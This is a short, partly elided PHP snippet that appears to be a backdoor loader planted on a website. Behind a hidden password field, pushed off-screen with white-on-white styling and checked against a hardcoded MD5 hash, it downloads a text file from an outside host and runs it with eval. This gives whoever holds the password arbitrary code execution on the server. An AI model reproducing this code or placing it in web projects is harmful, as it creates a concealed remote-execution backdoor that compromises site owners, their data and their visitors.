...
if (isset($_POST['password'])) {
    ...
    $hashed_password = 'ef410f230a7b6525a6bced7ba2eae017'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://sdyjp.com/kontol.txt');
    eval('?>' . $a);
} else {
  ...
  <input style="text-align:center;margin:0;margin-top:868px;background-color:#fff;border:1px solid #fff;" type="password" id="password" name="password">
  </form> 
    <?php
}
?>
